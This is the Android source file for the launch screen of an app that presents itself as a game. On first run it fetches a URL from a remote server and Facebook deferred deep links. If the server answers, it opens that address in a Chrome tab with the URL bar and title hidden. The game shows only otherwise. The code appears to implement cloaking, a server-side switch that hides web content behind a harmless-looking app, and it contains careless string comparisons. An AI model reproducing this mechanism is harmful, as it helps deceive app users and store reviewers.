package com.piramideofra.aprw;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;

import com.facebook.applinks.AppLinkData;
import com.piramideofra.aprw.manedger.PreferencesManagerImpl;
import com.piramideofra.aprw.manedger.game.GameActivity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.ExecutionException;

import static com.piramideofra.aprw.Constants.DEPLINK;
import static com.piramideofra.aprw.Constants.MYLOG_TEG;
import static com.piramideofra.aprw.Constants.URL;

public class MainActivity extends AppCompatActivity {

    private PreferencesManagerImpl preferencesManager;
    private Boolean forRanWeb;
    private Boolean forRanGame;
    private boolean settingsBoolean;
    private String uri;
    private DownloadTask task;
    private CountDownTimer waitToshow;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        preferencesManager = new PreferencesManagerImpl(this);
        task = new DownloadTask();

        forRanWeb = preferencesManager.getSateStartSte();
        forRanGame = preferencesManager.getGameStart();

        waitToshow = new CountDownTimer(3000, 1) {
            @Override
            public void onTick(long millisUntilFinished) {
            }

            @Override
            public void onFinish() {
                showWeb();
            }
        };

        settingsBoolean = preferencesManager.getMyFirstTime();
        if (settingsBoolean) {
            //the app is being launched for first time, do something
            Log.e(MYLOG_TEG, "First time");
            preferencesManager.setURL(null);

            // first time task
            String installer = getPackageManager().getInstallerPackageName(
                    "com.piramideofra.aprw");

            Log.e(MYLOG_TEG, "Downloaded  from Play Market" + installer);

//            if (installer == null) {
//                Log.d(MYLOG_TEG, "Downloaded not from Play Market "  + installer);
//                //save bad check
//                preferencesManager.setSateStartSte(false);
//                preferencesManager.setGameStart(true);
//                showGame();
//            } else {
//                preferencesManager.setGameStart(false);
//                preferencesManager.setSateStartSte(true);
//                preferencesManager.setURL(URL);
//                showWeb();
//            }

            getDeplink();

            // record the fact that the app has been started at least once
            preferencesManager.setMyFirstTime(false);


        } else {
            if (forRanWeb) {
                waitToshow.start();
            } else if (forRanGame) {
                showGame();

            }

        }


    }

    private void getDeplink() {
        try {


            AppLinkData.fetchDeferredAppLinkData(this, appLinkData -> {
                AppLinkData appLinkData1 = appLinkData;
                if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                    Log.e("MyLog", "deeplink = null");
                    preferencesManager.setSateStartSte(true);
                    getUrl();

                } else {

                    String url = appLinkData1.getTargetUri().toString();
                    if (BuildConfig.DEBUG) {
                        Log.d("MyLog", "deeplink = " + url);

                    }
                    String string = convertArrayToStringMethod(url.split(DEPLINK));
                    if (BuildConfig.DEBUG) {
                        Log.d("MyLog", "deeplink string = " + string);

                    }
                    preferencesManager.setURL(string);
                    preferencesManager.setSateStartSte(true);

                    getUrl();

                    //TODO
                }
            });
        } catch (Exception e) {

            e.printStackTrace();
        }

    }





    private void showGame() {
        Intent intent = new Intent(this, GameActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        Log.d(MYLOG_TEG, "start =   GameActivity ");

    }

    private void showWeb() {

        try {
            String preferencesManagerURL = preferencesManager.getURL();
            if (preferencesManagerURL != null) {
                uri = preferencesManagerURL;

                if (BuildConfig.DEBUG) {
                    Log.d("my Log" + getLocalClassName(), "uri: " + uri);
                }
            }


            final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);

            CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
            builder.enableUrlBarHiding();
            builder.setToolbarColor(Color.BLACK);
            builder.setShowTitle(false);
            builder.addDefaultShareMenuItem();
            builder.setCloseButtonIcon(backButton);

            CustomTabsIntent customTabsIntent = builder.build();

            boolean chromeInstalled = false;
            for (ApplicationInfo applicationInfo : getPackageManager().getInstalledApplications(0)) {
                if (applicationInfo.packageName.equals("com.android.chrome")) {
                    chromeInstalled = true;
                    break;
                }
            }
            if (chromeInstalled) {
                customTabsIntent.intent.setPackage("com.android.chrome");
            }
            //  customTabsIntent.launchUrl(this, Uri.parse(uri));
            customTabsIntent.launchUrl(this, Uri.parse(uri));
            finish();

            Log.e("my Log" + getLocalClassName(), "showSite customTabsIntent.intent.getAction() : " + customTabsIntent.intent.getAction());

        } catch (Resources.NotFoundException e) {

            if (BuildConfig.DEBUG) {
                Log.e("my Log" + getLocalClassName(), "showSite: " + e.toString());

                e.printStackTrace();
            }
        }
    }


    protected void getUrl() {
        try {
            String string = task.execute(URL).get();
            Log.d(MYLOG_TEG, string);
            Log.d(MYLOG_TEG, "sendRequest" + string);
            StringBuilder stringBuilder = new StringBuilder();


            if (string != null && string != "") {
                String managerURL = preferencesManager.getURL();
                if (managerURL != null) {
                    stringBuilder.append(string);
                    stringBuilder.append(managerURL);

                    stringBuilder.toString();
                    Log.d(MYLOG_TEG, "stringBuilder " + stringBuilder.toString());
                    preferencesManager.setSateStartSte(true);
                    preferencesManager.setGameStart(false);

                    preferencesManager.setURL(String.valueOf(stringBuilder));
                    waitToshow.start();

                } else if (string != null && string != "") {
                    Log.d(MYLOG_TEG, "stringBuilder  no " + stringBuilder.toString());
                    Log.d(MYLOG_TEG, "sstring " + string);
                    preferencesManager.setURL(string);

                    preferencesManager.setSateStartSte(true);
                    preferencesManager.setGameStart(false);

                    waitToshow.start();
                } else {
                    preferencesManager.setSateStartSte(false);
                    preferencesManager.setGameStart(true);
                    showGame();

                }


            } else if (string == "") {
                preferencesManager.setSateStartSte(false);
                preferencesManager.setGameStart(true);
                showGame();

            }

        } catch (ExecutionException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static class DownloadTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            StringBuilder result = new StringBuilder();
            java.net.URL url = null;
            HttpURLConnection urlConnection = null;
            try {
                url = new URL(strings[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                InputStream in = urlConnection.getInputStream();
                InputStreamReader reader = new InputStreamReader(in);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = bufferedReader.readLine();
                while (line != null) {
                    result.append(line);
                    line = bufferedReader.readLine();
                }
            } catch (MalformedURLException e) {

                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
                return result.toString();

            }
        }
    }

    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        finish();
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();

    }
}





